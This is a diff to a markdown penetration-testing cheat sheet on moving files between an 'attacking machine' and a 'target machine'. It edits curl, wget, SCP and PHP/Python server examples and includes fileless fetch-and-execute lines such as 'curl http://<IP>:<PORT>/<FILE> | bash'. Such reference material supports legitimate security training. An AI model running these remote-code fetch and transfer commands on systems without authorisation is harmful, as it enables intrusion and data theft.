@@ -321,7 +321,12 @@ wget -qO- <FILE URL> | python3
 
 **Basic Download**  
 ```bash
-curl -O <FILE URL>
+curl -O http://<IP>:<PORT>/<FILE>
+```
+
+**Ignore SSL certificate**  
+```bash
+curl -k -O https://<IP>:<PORT>/<FILE>
 ```
 
 **Download with Custom Filename**  
@@ -331,13 +336,13 @@ curl -o <OUTPUT FILE> <FILE URL>
 
 **Download with Authentication**  
 ```bash
-curl -u <USER>:<PASSWORD> -O <FILE URL>
+curl -u <USER>:<PASSWORD> -O http://<IP>:<PORT>/<FILE>
 ```
 
 **Fileless Download**  
 ```bash
 # Executes it directly
-curl <FILE URL> | bash
+curl http://<IP>:<PORT>/<FILE> | bash
 ```
 
 </details>
@@ -363,22 +368,18 @@ cat <&3
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
 <summary><h3>SSH Downloads</h3></summary>
 
-**Enabling the SSH Server**  
+**Attacking machine: Starting the SSH Server**  
 ```bash
 sudo systemctl enable ssh
-```
-
-**Starting the SSH Server**  
-```bash
 sudo systemctl start ssh
 ```
 
-**Checking for SSH Listening Port**  
+**Attacking machine: Checking for SSH Listening Port**  
 ```bash
 netstat -lnpt
 ```
 
-**Downloading Files Using SCP**  
+**Target machine: Downloading Files Using SCP**  
 ```bash
 scp <USER>@<IP>:<FILE PATH> . 
 ```
@@ -413,10 +414,7 @@ mv ~/<FILE> .
 sudo python3 -m uploadserver --server-certificate ~/server.pem 443
 ```
 
-**Target machine: Download the file from the server**  
-```bash
-curl -k -O https://<IP>/upload/<FILE>
-```
+> **_Target machine:_**  Refer to the "Downloads" section for available transfer methods.
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
@@ -483,17 +481,8 @@ php -S 0.0.0.0:8000
 ```bash
 php -S 0.0.0.0:8000
 ```
-
-**Attacking machine: Download the File from the Target Machine**  
-```bash
-wget http://<IP>:8000/<FILE>
-
-wget --no-check-certificate https://<IP>:8000/<FILE>
-
-curl -O http://<IP>:8000/<FILE>
-
-curl -k -O https://<IP>:8000/<FILE>
-```
+ 
+> **_Attacking machine:_**  Refer to the "Downloads" section for available transfer methods.
 
 </details>
 </details>
